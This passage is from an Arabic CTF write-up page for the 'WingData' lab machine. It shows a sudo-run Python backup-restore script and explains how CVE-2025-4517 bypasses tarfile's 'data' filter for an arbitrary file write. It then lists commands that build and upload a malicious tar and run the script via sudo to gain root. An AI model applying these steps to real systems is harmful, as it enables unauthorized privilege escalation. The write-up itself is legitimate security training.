+    return client_id.isdigit() and client_id != &quot;0&quot;
+
+def validate_restore_tag(tag):
+    return bool(re.fullmatch(r&quot;^[a-zA-Z0-9_]{1,24}$&quot;, tag))
+
+def main():
+    parser = argparse.ArgumentParser(
+        description=&quot;Restore client configuration from a validated backup tarball.&quot;,
+        epilog=&quot;Example: sudo %(prog)s -b backup_1001.tar -r restore_john&quot;
+    )
+    parser.add_argument(
+        &quot;-b&quot;, &quot;--backup&quot;,
+        required=True,
+        help=&quot;Backup filename (must be in /home/wacky/backup_clients/ and match backup_&lt;client_id&gt;.tar, &quot;
+             &quot;where &lt;client_id&gt; is a positive integer, e.g., backup_1001.tar)&quot;
+    )
+    parser.add_argument(
+        &quot;-r&quot;, &quot;--restore-dir&quot;,
+        required=True,
+        help=&quot;Staging directory name for the restore operation. &quot;
+             &quot;Must follow the format: restore_&lt;client_user&gt; (e.g., restore_john). &quot;
+             &quot;Only alphanumeric characters and underscores are allowed in the &lt;client_user&gt; part (1–24 characters).&quot;
+    )
+
+    args = parser.parse_args()
+
+    if not validate_backup_name(args.backup):
+        print(&quot;[!] Invalid backup name. Expected format: backup_&lt;client_id&gt;.tar (e.g., backup_1001.tar)&quot;, file=sys.stderr)
+        sys.exit(1)
+
+    backup_path = os.path.join(BACKUP_BASE_DIR, args.backup)
+    if not os.path.isfile(backup_path):
+        print(f&quot;[!] Backup file not found: {backup_path}&quot;, file=sys.stderr)
+        sys.exit(1)
+
+    if not args.restore_dir.startswith(&quot;restore_&quot;):
+        print(&quot;[!] --restore-dir must start with &#39;restore_&#39;&quot;, file=sys.stderr)
+        sys.exit(1)
+
+    tag = args.restore_dir[8:]
+    if not tag:
+        print(&quot;[!] --restore-dir must include a non-empty tag after &#39;restore_&#39;&quot;, file=sys.stderr)
+        sys.exit(1)
+
+    if not validate_restore_tag(tag):
+        print(&quot;[!] Restore tag must be 1–24 characters long and contain only letters, digits, or underscores&quot;, file=sys.stderr)
+        sys.exit(1)
+
+    staging_dir = os.path.join(STAGING_BASE, args.restore_dir)
+    print(f&quot;[+] Backup: {args.backup}&quot;)
+    print(f&quot;[+] Staging directory: {staging_dir}&quot;)
+
+    os.makedirs(staging_dir, exist_ok=True)
+
+    try:
+        with tarfile.open(backup_path, &quot;r&quot;) as tar:
+            tar.extractall(path=staging_dir, filter=&quot;data&quot;)
+        print(f&quot;[+] Extraction completed in {staging_dir}&quot;)
+    except (tarfile.TarError, OSError, Exception) as e:
+        print(f&quot;[!] Error during extraction: {e}&quot;, file=sys.stderr)
+        sys.exit(2)
+
+if __name__ == &quot;__main__&quot;:
+    main()</code></pre></section><p>&gt; يستخدم البرنامج النصي الدالة <strong>()tarfile.extractall</strong> مع وسيطة  “<strong>filter=&quot;data </strong>. على الرغم من أن هذا الفلتر تم تقديمه في <strong>Python 3.12</strong> لمنع هجمات Path Traversal (TarSlip)، إلا أنه عرضة لـثغرة</p><p>[\[\[CVE-2025-4517\]\]](/3597739eb4128016805fe42471bd4776?pvs=25)</p><p><strong>تسمح هذه الثغرة الأمنية للمهاجم بتجاوز عامل التصفية &quot;الآمن&quot; عن طريق إنشاء أرشيف tar بسلسلة محددة من الارتباطات الرمزية وهياكل الدليل التي تتجاوز PATH_MAX للنظام. عندما يصبح المسار طويلًا جدًا، تفشل عملية تسوية المسار الحقيقي في Python، مما يسمح بكتابة الملفات خارج دليل STAGING_BASE المقصود.</strong></p><p>&lt;br&gt;التقرير ده بيستخدم <strong>CVE-2025-4517</strong>. الثغرة دي بتخدع فلتر الأمان الجديد في بايثون (<code dir="ltr">filter=&quot;data&quot;</code>) عن طريق عمل <strong>Path Overflow</strong>. الفكرة إننا بنعمل مسار طويل جداً يخلي نظام التشغيل يفشل في معالجة الروابط الرمزية، وده بيسمح لنا نكتب في أي مكان (Arbitrary File Write).&lt;br&gt;&lt;br&gt;</p><aside class="ctf-callout"><p>قم باستخدام &lt;mention-page url=&quot;https://app.notion.com/p/3597739eb4128016805fe42471bd4776&quot;/&gt;  للحصول على ملف  tar الملغم الي هيتم رفعه للسيرفر للستغلال الثغرة عن طريق الامر التالي :</p></aside><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">python</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code># انسخه اولا داخل ملف وسميه اي اسم مثلا privsec.py
+# ثم قم بتشغيل الملف 
+python3 privsec.py -u http://ftp.wingdata.htb 
+# قم بنسخ الملف الى السيرفر عن طريق الامر التالي : 
+scp backup_9999.tar wacky@10.129.49.142:/tmp/
+#قم بتشغيل البرنامج النصي عبر مسار sudo المسموح به
+sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.p</code></pre></section><figure class="ctf-report-figure"><img src="../assets/images/ctfs/wingdata-12.png" alt="لقطة شاشة من تقرير WingData" loading="lazy"><figcaption>لقطة شاشة من تقرير WingData</figcaption></figure><p><strong>يمكنك الان ان ترى نجاح خطواتك من خلال الامر    </strong><strong><code dir="ltr">- sudo su</code></strong></p><figure class="ctf-report-figure"><img src="../assets/images/ctfs/wingdata-13.png" alt="لقطة شاشة من تقرير WingData" loading="lazy"><figcaption>لقطة شاشة من تقرير WingData</figcaption></figure><p>قمنا ايضا اثناء الفحص بستكشاف بعض النطاقات الاخرى المشبوهة ولكن لم نعثر على اشياء مهمة</p><figure class="ctf-report-figure"><img src="../assets/images/ctfs/wingdata-14.png" alt="لقطة شاشة من تقرير WingData" loading="lazy"><figcaption>لقطة شاشة من تقرير WingData</figcaption></figure><figure class="ctf-report-figure"><img src="../assets/images/ctfs/wingdata-15.png" alt="لقطة شاشة من تقرير WingData" loading="lazy"><figcaption>لقطة شاشة من تقرير WingData</figcaption></figure><figure class="ctf-report-figure"><img src="../assets/images/ctfs/wingdata-16.png" alt="لقطة شاشة من تقرير WingData" loading="lazy"><figcaption>لقطة شاشة من تقرير WingData</figcaption></figure><h2>شكرا لوقتك اتمنى ان يكون مفيدا لك {color=&quot;blue&quot;}</h2></div>
+      <footer class="ctf-report-end"><a href="index.html" class="btn-primary"><i class="fa-solid fa-arrow-right"></i> كل تقارير CTF</a></footer>
+    </article>
+  </main>
+  <footer class="footer"><div class="footer-content">
+    <div class="footer-logo">Ft7y<span>.Sec</span></div>
+    <div class="footer-links">
+      <a href="../index.html#home">الرئيسية</a><a href="../pentest.html">اختبار الاختراق</a><a href="../appsec.html">أمن التطبيقات</a><a href="../automation.html">البرمجة والأتمتة</a><a href="../systems-labs.html">الأنظمة والمعامل</a><a href="../writeups.html">CTF Write-ups</a>
+    </div>
+    <p>© 2026 Ft7y.Sec. جميع الحقوق محفوظة.</p>
+  </div></footer>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/aos/2.3.4/aos.js"></script>
+  <script src="../script.js"></script>
+</body>
+</html>
